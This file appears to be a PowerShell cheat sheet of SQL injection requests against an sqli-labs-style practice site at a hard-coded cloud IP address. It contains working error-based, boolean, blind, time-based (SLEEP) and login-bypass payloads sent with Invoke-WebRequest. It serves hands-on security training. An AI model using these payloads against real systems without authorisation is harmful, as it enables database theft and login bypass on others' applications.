# PowerShell SQLi Testing Examples
#
# Replace $ip with your GCP instance external IP.

$ip = "34.59.129.231"

# ============================================================================
# Less-1: Error-Based String Injection
# ============================================================================

# Normal Request
(iwr "http://$ip/Less-1/?id=1").Content.Trim() | Select-String -Pattern 'password'

# Test for Vulnerability

# Single quote causes SQL error
iwr "http://$ip/Less-1/?id=1'"

# Confirm with comment
iwr "http://$ip/Less-1/?id=1'--"

# Extract data
iwr "http://$ip/Less-1/?id=1' OR '1'='1"

# ============================================================================
# Less-2: Error-Based Numeric Injection
# ============================================================================

# Normal Request
iwr "http://$ip/Less-2/?id=1"

# Test for Vulnerability

# Boolean-based
iwr "http://$ip/Less-2/?id=1 AND 1=1"
iwr "http://$ip/Less-2/?id=1 AND 1=2"

# Extract all rows
iwr "http://$ip/Less-2/?id=1 OR 1=1"

# ============================================================================
# Less-3: String with Twist (')
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-3/?id=1'"
iwr "http://$ip/Less-3/?id=1') OR ('1'='1"

# ============================================================================
# Less-4: Double Quotes
# ============================================================================

# Test for Vulnerability
iwr "http://$ip/Less-4/?id=1`""
iwr "http://$ip/Less-4/?id=1`") OR (`"1`"=`"1"

# ============================================================================
# Less-8: Blind Boolean-Based
# ============================================================================

# Test for Vulnerability

# True condition (page loads normally)
iwr "http://$ip/Less-8/?id=1' AND '1'='1"

# False condition (different response)
iwr "http://$ip/Less-8/?id=1' AND '1'='2"

# ============================================================================
# POST-Based Example (Less-11)
# ============================================================================

# Normal login
$body = @{
    uname = "admin"
    passwd = "password"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# SQL Injection
$body = @{
    uname = "admin' OR '1'='1"
    passwd = "anything"
}
iwr "http://$ip/Less-11/" -Method POST -Body $body

# ============================================================================
# Useful PowerShell Tips
# ============================================================================

# View Response Content
$response = iwr "http://$ip/Less-1/?id=1"
$response.Content

# View Status Code
$response.StatusCode

# Measure Response Time (Blind Time-Based)
Measure-Command { iwr "http://$ip/Less-9/?id=1' AND SLEEP(5)--" }

# Save Response to File
iwr "http://$ip/Less-1/?id=1" -OutFile response.html

# ============================================================================
# URL Encoding in PowerShell
# ============================================================================

# PowerShell handles most encoding automatically, but for special chars:
[System.Web.HttpUtility]::UrlEncode("1' OR '1'='1")

# Or use backtick for escaping in double quotes
iwr "http://$ip/Less-1/?id=1`' OR `'1`'=`'1"
